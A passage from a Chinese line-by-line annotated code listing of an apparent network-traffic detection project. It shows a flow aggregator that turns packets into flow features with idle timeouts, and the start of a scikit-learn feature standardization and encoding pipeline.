| 124 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 125 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        dst_ip = str(pkt.get("dst_ip", ""))` |
| 126 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        dst_port = int(pkt.get("dst_port", 0) or 0)` |
| 127 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        proto = str(pkt.get("protocol", "OTHER"))` |
| 128 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._src_activity[src].append((ts, dst_ip, dst_port, proto))` |
| 129 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._prune_src_window(src, ts)` |
| 130 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 131 | 函数定义：声明 `_window_stats_for_src` 的输入、处理逻辑和返回结果。 | `    def _window_stats_for_src(self, src_ip: str, now: float) -> Tuple[int, int, Dict[str, int]]:` |
| 132 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._prune_src_window(src_ip, now)` |
| 133 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        dq = self._src_activity.get(src_ip)` |
| 134 | 条件判断：满足条件时进入对应分支。 | `        if not dq:` |
| 135 | 返回结果：把处理后的值交回调用方。 | `            return 0, 0, {}` |
| 136 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        uniq_dst = {item[1] for item in dq if item[1]}` |
| 137 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        uniq_dport = {item[2] for item in dq}` |
| 138 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        protos = [item[3] for item in dq]` |
| 139 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        dist = dict(Counter(protos))` |
| 140 | 返回结果：把处理后的值交回调用方。 | `        return len(uniq_dst), len(uniq_dport), dist` |
| 141 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 142 | 函数定义：声明 `_build_low_confidence_feature` 的输入、处理逻辑和返回结果。 | `    def _build_low_confidence_feature(` |
| 143 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self, pkt: Dict[str, Any], now: float` |
| 144 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> Dict[str, Any]:` |
| 145 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        plen = int(pkt.get("packet_len", 0) or 0)` |
| 146 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        flags = str(pkt.get("tcp_flags", ""))` |
| 147 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        syn_count = 1 if "S" in flags else 0` |
| 148 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ack_count = 1 if "A" in flags else 0` |
| 149 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        fin_count = 1 if "F" in flags else 0` |
| 150 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        rst_count = 1 if "R" in flags else 0` |
| 151 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        src_ip = str(pkt.get("src_ip", ""))` |
| 152 | 函数调用：执行已有函数/方法完成当前步骤。 | `        w_dst, w_port, w_proto = self._window_stats_for_src(src_ip, now)` |
| 153 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        feat: Dict[str, Any] = {` |
| 154 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "schema_version": self.SCHEMA_VERSION,` |
| 155 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "src_ip": pkt.get("src_ip", ""),` |
| 156 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "dst_ip": pkt.get("dst_ip", ""),` |
| 157 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "src_port": int(pkt.get("src_port", 0) or 0),` |
| 158 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "dst_port": int(pkt.get("dst_port", 0) or 0),` |
| 159 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "protocol": str(pkt.get("protocol", "OTHER")),` |
| 160 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "packet_count": 1,` |
| 161 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "byte_count": plen,` |
| 162 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "flow_pkt_count": 1,` |
| 163 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "flow_byte_count": plen,` |
| 164 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "flow_duration": 0.0,` |
| 165 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "flow_pkt_rate": 0.0,` |
| 166 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "flow_byte_rate": 0.0,` |
| 167 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "window_unique_dst_ip": w_dst,` |
| 168 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "window_unique_dst_port": w_port,` |
| 169 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "window_protocol_dist": w_proto,` |
| 170 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "pkt_len_mean": float(plen),` |
| 171 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "pkt_len_std": 0.0,` |
| 172 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "pkt_len_max": float(plen),` |
| 173 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "pkt_len_min": float(plen),` |
| 174 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "syn_count": syn_count,` |
| 175 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "ack_count": ack_count,` |
| 176 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "fin_count": fin_count,` |
| 177 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "rst_count": rst_count,` |
| 178 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "flow_low_confidence": True,` |
| 179 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 180 | 函数调用：执行已有函数/方法完成当前步骤。 | `        attach_network_flow_v1_block(feat)` |
| 181 | 返回结果：把处理后的值交回调用方。 | `        return feat` |
| 182 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 183 | 函数定义：声明 `_enrich_network_flow_v1` 的输入、处理逻辑和返回结果。 | `    def _enrich_network_flow_v1(` |
| 184 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 185 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        base: Dict[str, Any],` |
| 186 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        packets: List[Dict[str, Any]],` |
| 187 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        now: float,` |
| 188 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> Dict[str, Any]:` |
| 189 | 条件判断：满足条件时进入对应分支。 | `        if not packets:` |
| 190 | 返回结果：把处理后的值交回调用方。 | `            return base` |
| 191 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        times = [_packet_timestamp_seconds(p, now) for p in packets]` |
| 192 | 函数调用：执行已有函数/方法完成当前步骤。 | `        t0, t1 = min(times), max(times)` |
| 193 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        span = max(t1 - t0, 1e-9)` |
| 194 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        pkt_count = len(packets)` |
| 195 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        byte_sum = int(` |
| 196 | 函数调用：执行已有函数/方法完成当前步骤。 | `            sum(int(p.get("packet_len", 0) or 0) for p in packets)` |
| 197 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 198 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        src_ip = str(base.get("src_ip", packets[0].get("src_ip", "")))` |
| 199 | 函数调用：执行已有函数/方法完成当前步骤。 | `        w_dst, w_port, w_proto = self._window_stats_for_src(src_ip, now)` |
| 200 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 201 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        base["schema_version"] = self.SCHEMA_VERSION` |
| 202 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        base["packet_count"] = int(base.get("flow_pkt_count", pkt_count))` |
| 203 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        base["byte_count"] = int(base.get("flow_byte_count", byte_sum))` |
| 204 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        base["flow_duration"] = float(t1 - t0)` |
| 205 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        base["flow_pkt_rate"] = float(pkt_count) / span` |
| 206 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        base["flow_byte_rate"] = float(byte_sum) / span` |
| 207 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        base["window_unique_dst_ip"] = w_dst` |
| 208 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        base["window_unique_dst_port"] = w_port` |
| 209 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        base["window_protocol_dist"] = w_proto` |
| 210 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        base["flow_low_confidence"] = False` |
| 211 | 函数调用：执行已有函数/方法完成当前步骤。 | `        attach_network_flow_v1_block(base)` |
| 212 | 返回结果：把处理后的值交回调用方。 | `        return base` |
| 213 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 214 | 函数定义：声明 `tick` 的输入、处理逻辑和返回结果。 | `    def tick(` |
| 215 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 216 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        packets: List[Dict[str, Any]],` |
| 217 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        now: Optional[float] = None,` |
| 218 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> List[Dict[str, Any]]:` |
| 219 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 220 | 代码语句：参与当前文件的业务流程或数据处理。 | `        摄入本 tick 的数据包，根据空闲超时发射 \`\`network_flow_v1\`\` 特征列表。` |
| 221 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 222 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        wall = float(now if now is not None else time.time())` |
| 223 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        emitted: List[Dict[str, Any]] = []` |
| 224 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 225 | 循环：逐个处理集合或迭代器中的元素。 | `        for pkt in packets:` |
| 226 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 227 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                key = _make_flow_key(pkt)` |
| 228 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:  # noqa: BLE001` |
| 229 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.debug("[FlowWindowAggregator] 跳过无效包 key: %s", exc)` |
| 230 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self.counters.malformed_packet_skips += 1` |
| 231 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 232 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 233 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ts = _packet_timestamp_seconds(pkt, wall)` |
| 234 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            buf = self._flows.get(key)` |
| 235 | 条件判断：满足条件时进入对应分支。 | `            if buf is None:` |
| 236 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                buf = _FlowBuffer()` |
| 237 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                buf.first_ts = ts` |
| 238 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                buf.last_ts = ts` |
| 239 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                buf.packets = [pkt]` |
| 240 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                self._flows[key] = buf` |
| 241 | 兜底分支：处理前面条件都不满足的情况。 | `            else:` |
| 242 | 函数调用：执行已有函数/方法完成当前步骤。 | `                buf.packets.append(pkt)` |
| 243 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                buf.last_ts = max(buf.last_ts, ts)` |
| 244 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                buf.first_ts = min(buf.first_ts, ts)` |
| 245 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 246 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 247 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._record_src_window(pkt, ts)` |
| 248 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:  # noqa: BLE001` |
| 249 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.debug("[FlowWindowAggregator] 源窗口记录失败: %s", exc)` |
| 250 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 251 | 注释：解释下面或当前这段代码的设计意图。 | `        # 空闲超时：发射并移除` |
| 252 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        idle_keys: List[str] = []` |
| 253 | 循环：逐个处理集合或迭代器中的元素。 | `        for key, buf in list(self._flows.items()):` |
| 254 | 条件判断：满足条件时进入对应分支。 | `            if wall - buf.last_ts < self.cfg.flow_idle_timeout_sec:` |
| 255 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 256 | 函数调用：执行已有函数/方法完成当前步骤。 | `            idle_keys.append(key)` |
| 257 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 258 | 循环：逐个处理集合或迭代器中的元素。 | `        for key in idle_keys:` |
| 259 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            buf = self._flows.pop(key, None)` |
| 260 | 条件判断：满足条件时进入对应分支。 | `            if buf is None:` |
| 261 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 262 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            pkts = buf.packets` |
| 263 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            n = len(pkts)` |
| 264 | 条件判断：满足条件时进入对应分支。 | `            if n >= self.cfg.min_flow_packets:` |
| 265 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                feats = self._extractor.extract(list(pkts))` |
| 266 | 循环：逐个处理集合或迭代器中的元素。 | `                for f in feats:` |
| 267 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    enriched = self._enrich_network_flow_v1(f, pkts, wall)` |
| 268 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    emitted.append(enriched)` |
| 269 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    self.counters.flows_emitted += 1` |
| 270 | 条件判断：满足条件时进入对应分支。 | `                if not feats:` |
| 271 | 日志记录：输出运行状态、调试信息或异常线索。 | `                    logger.warning(` |
| 272 | 代码语句：参与当前文件的业务流程或数据处理。 | `                        "[FlowWindowAggregator] extractor 未返回特征但包数=%d key=%s",` |
| 273 | 代码语句：参与当前文件的业务流程或数据处理。 | `                        n,` |
| 274 | 代码语句：参与当前文件的业务流程或数据处理。 | `                        key,` |
| 275 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    )` |
| 276 | 条件分支：前面条件不满足时继续判断。 | `            elif n == 1:` |
| 277 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                pol = self.cfg.single_packet_idle_policy.lower()` |
| 278 | 条件判断：满足条件时进入对应分支。 | `                if pol == "emit_low_confidence":` |
| 279 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    emitted.append(self._build_low_confidence_feature(pkts[0], wall))` |
| 280 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    self.counters.flows_emitted += 1` |
| 281 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    self.counters.low_confidence_emissions += 1` |
| 282 | 兜底分支：处理前面条件都不满足的情况。 | `                else:` |
| 283 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    self.counters.single_packet_discarded += 1` |
| 284 | 兜底分支：处理前面条件都不满足的情况。 | `            else:` |
| 285 | 注释：解释下面或当前这段代码的设计意图。 | `                # 1 < n < min_flow_packets：空闲到期仍不足最小包数，丢弃` |
| 286 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self.counters.partial_flow_discarded += 1` |
| 287 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 288 | 返回结果：把处理后的值交回调用方。 | `        return emitted` |

## `src/features/pipeline.py`

- 类型：特征工程
- 行数：188

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `特征处理流水线` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `对应架构文档 §4.3 特征处理流水线` |
| 4 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `将 FlowFeatureExtractor / WebFeatureExtractor 产出的「特征字典列表」` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `标准化为统一的 numpy 二维数组,供下游各机器学习模型直接使用。` |
| 7 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 8 | 代码语句：参与当前文件的业务流程或数据处理。 | `工作流程:` |
| 9 | 函数调用：执行已有函数/方法完成当前步骤。 | `    1. fit(train_features)       拟合 StandardScaler + 每列 LabelEncoder;` |
| 10 | 函数调用：执行已有函数/方法完成当前步骤。 | `    2. transform(any_features)   转换为 (N, D) 的 numpy 数组;` |
| 11 | 函数调用：执行已有函数/方法完成当前步骤。 | `    3. save(path) / load(path)   通过 joblib 持久化整个流水线。` |
| 12 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 13 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 14 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 15 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 16 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Dict, List` |
| 17 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 18 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import joblib` |
| 19 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import numpy as np` |
| 20 | 导入对象：从指定模块引入类、函数或常量。 | `from sklearn.preprocessing import LabelEncoder, StandardScaler` |
| 21 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 22 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger(__name__)` |
| 23 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 24 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 25 | 类定义：声明 `FeaturePipeline`，封装相关状态与行为。 | `class FeaturePipeline:` |
| 26 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 27 | 代码语句：参与当前文件的业务流程或数据处理。 | `    统一的特征标准化 + 类别编码流水线。` |
| 28 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 29 | 代码语句：参与当前文件的业务流程或数据处理。 | `    设计要点:` |
| 30 | 函数调用：执行已有函数/方法完成当前步骤。 | `        - 数值列自动识别(\`\`select_dtypes(include=[np.number])\`\`);` |
| 31 | 函数调用：执行已有函数/方法完成当前步骤。 | `        - 类别列自动识别(\`\`select_dtypes(include=['object'])\`\`);` |
| 32 | 代码语句：参与当前文件的业务流程或数据处理。 | `        - 【安全】transform 阶段未见过的类别编码为 -1,不抛异常,` |
| 33 | 代码语句：参与当前文件的业务流程或数据处理。 | `          避免因单个异常类别导致整个在线检测流水线中断。` |
| 34 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 35 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 36 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    UNKNOWN_CATEGORY_CODE: int = -1` |
| 37 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 38 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(self) -> None:` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.scaler: StandardScaler = StandardScaler()` |
| 40 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.label_encoders: Dict[str, LabelEncoder] = {}` |
| 41 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.numeric_columns: List[str] = []` |
| 42 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.categorical_columns: List[str] = []` |
| 43 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._fitted: bool = False` |
| 44 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 45 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---------- 内部辅助 ----------` |
| 46 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 47 | 装饰器：为下面的函数或类附加框架行为。 | `    @staticmethod` |
| 48 | 函数定义：声明 `_to_dataframe` 的输入、处理逻辑和返回结果。 | `    def _to_dataframe(features_list: List[dict]):` |
| 49 | 文档字符串：说明当前模块、类或函数的职责。 | `        """延迟导入 pandas,避免顶层依赖拖慢模块首次 import。"""` |
| 50 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `        import pandas as pd  # noqa: WPS433 - 本地延迟导入是故意为之` |
| 51 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 52 | 返回结果：把处理后的值交回调用方。 | `        return pd.DataFrame(features_list)` |
| 53 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 54 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---------- 核心 API ----------` |
| 55 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 56 | 函数定义：声明 `fit` 的输入、处理逻辑和返回结果。 | `    def fit(self, features_list: List[dict]) -> "FeaturePipeline":` |
| 57 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 58 | 代码语句：参与当前文件的业务流程或数据处理。 | `        从训练数据中拟合标准化参数和类别编码器。` |
| 59 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 60 | 函数调用：执行已有函数/方法完成当前步骤。 | `        当输入由多个来源(流特征 + Web 特征)合并时,某些样本可能` |
| 61 | 代码语句：参与当前文件的业务流程或数据处理。 | `        缺失另一来源的列,此处统一:数值列缺失填 0,类别列缺失填空串。` |
| 62 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 63 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Args:` |
| 64 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            features_list: 特征字典列表。` |
| 65 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 66 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Returns:` |
| 67 | 代码语句：参与当前文件的业务流程或数据处理。 | `            self,方便链式调用。` |
| 68 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 69 | 条件判断：满足条件时进入对应分支。 | `        if not features_list:` |
| 70 | 抛出异常：主动报告不可继续的错误。 | `            raise ValueError("features_list 不能为空")` |
| 71 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 72 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        df = self._to_dataframe(features_list)` |
| 73 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 74 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.numeric_columns = df.select_dtypes(include=[np.number]).columns.tolist()` |
| 75 | 注释：解释下面或当前这段代码的设计意图。 | `        # pandas 3.x 中 object 不再隐式包含字符串列，显式包含 string 可避免迁移告警` |
| 76 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.categorical_columns = df.select_dtypes(` |
| 77 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            include=['object', 'string']` |
| 78 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ).columns.tolist()` |
| 79 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 80 | 注释：解释下面或当前这段代码的设计意图。 | `        # 缺失值处理:数值填 0,类别填空串(在线推理鲁棒性)` |
| 81 | 条件判断：满足条件时进入对应分支。 | `        if self.numeric_columns:` |
| 82 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            df[self.numeric_columns] = df[self.numeric_columns].fillna(0)` |
| 83 | 条件判断：满足条件时进入对应分支。 | `        if self.categorical_columns:` |
| 84 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            df[self.categorical_columns] = df[self.categorical_columns].fillna('')` |
| 85 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 86 | 注释：解释下面或当前这段代码的设计意图。 | `        # 拟合数值标准化` |
| 87 | 条件判断：满足条件时进入对应分支。 | `        if self.numeric_columns:` |
| 88 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self.scaler.fit(df[self.numeric_columns].values.astype(np.float64))` |
| 89 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 90 | 注释：解释下面或当前这段代码的设计意图。 | `        # 拟合类别编码(每列一个独立 LabelEncoder)` |
| 91 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.label_encoders = {}` |
| 92 | 循环：逐个处理集合或迭代器中的元素。 | `        for col in self.categorical_columns:` |
| 93 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            le = LabelEncoder()` |
| 94 | 函数调用：执行已有函数/方法完成当前步骤。 | `            le.fit(df[col].astype(str).values)` |
| 95 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self.label_encoders[col] = le` |
| 96 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 97 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._fitted = True` |
| 98 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.info(` |
| 99 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "[FeaturePipeline] fit 完成: 数值列=%d, 类别列=%d",` |
| 100 | 函数调用：执行已有函数/方法完成当前步骤。 | `            len(self.numeric_columns), len(self.categorical_columns),` |
| 101 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 102 | 返回结果：把处理后的值交回调用方。 | `        return self` |
| 103 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 104 | 函数定义：声明 `transform` 的输入、处理逻辑和返回结果。 | `    def transform(self, features_list: List[dict]) -> np.ndarray:` |
| 105 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 106 | 代码语句：参与当前文件的业务流程或数据处理。 | `        将特征字典列表转换为标准化后的二维 numpy 数组。` |
| 107 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 108 | 代码语句：参与当前文件的业务流程或数据处理。 | `        列顺序为 \`\`[numeric_columns..., categorical_columns...]\`\`。` |
| 109 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 110 | 代码语句：参与当前文件的业务流程或数据处理。 | `        【安全】对于训练时未见过的类别,编码为` |
| 111 | 函数调用：执行已有函数/方法完成当前步骤。 | `        \`\`UNKNOWN_CATEGORY_CODE (-1)\`\` 而非抛异常。` |
| 112 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 113 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Args:` |
| 114 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            features_list: 特征字典列表,可含训练时未见过的类别值。` |
| 115 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 116 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Returns:` |
| 117 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            shape = \`\`(len(features_list), len(numeric_columns) + len(categorical_columns))\`\`。` |
| 118 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 119 | 条件判断：满足条件时进入对应分支。 | `        if not self._fitted:` |
| 120 | 抛出异常：主动报告不可继续的错误。 | `            raise RuntimeError("FeaturePipeline 尚未 fit,不能 transform")` |
| 121 | 条件判断：满足条件时进入对应分支。 | `        if not features_list:` |
| 122 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            total_cols = len(self.numeric_columns) + len(self.categorical_columns)` |
| 123 | 返回结果：把处理后的值交回调用方。 | `            return np.empty((0, total_cols), dtype=np.float64)` |
| 124 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 125 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        df = self._to_dataframe(features_list)` |
